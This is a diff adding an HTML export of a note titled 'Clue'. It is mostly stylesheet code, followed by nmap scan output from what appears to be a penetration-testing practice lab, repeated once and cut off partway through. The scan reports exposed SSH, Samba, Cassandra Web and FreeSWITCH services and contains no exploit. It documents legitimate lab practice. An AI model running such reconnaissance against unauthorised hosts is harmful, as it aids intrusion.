@@ -1,0 +1,1497 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Clue</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Clue</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="clue">Clue</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.233.240 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 07:34 -0500
+Nmap scan report for 192.168.233.240
+Host is up (0.0066s latency).
+Not shown: 65529 filtered tcp ports (no-response)
+PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
+|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
+|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
+80/tcp   open  http             Apache httpd 2.4.38
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: 403 Forbidden
+139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+3000/tcp open  http             Thin httpd
+|_http-title: Cassandra Web
+|_http-server-header: thin
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
+Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-02-05T12:36:49
+|_  start_date: N/A
+|_clock-skew: mean: 1h40m01s, deviation: 2h53m14s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: clue
+|   NetBIOS computer name: CLUE\x00
+|   Domain name: pg
+|   FQDN: clue.pg
+|_  System time: 2026-02-05T07:36:50-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+TRACEROUTE (using port 445/tcp)
+HOP RTT     ADDRESS
+1   7.05 ms 192.168.45.1
+2   7.01 ms 192.168.45.254
+3   7.22 ms 192.168.251.1
+4   7.18 ms 192.168.233.240
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 167.31 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Clue]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.233.240 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 07:34 -0500
+Nmap scan report for 192.168.233.240
+Host is up (0.0066s latency).
+Not shown: 65529 filtered tcp ports (no-response)
+PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
+|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
+|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
+80/tcp   open  http             Apache httpd 2.4.38
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: 403 Forbidden
+139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+3000/tcp open  http             Thin httpd
+|_http-title: Cassandra Web
+|_http-server-header: thin
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
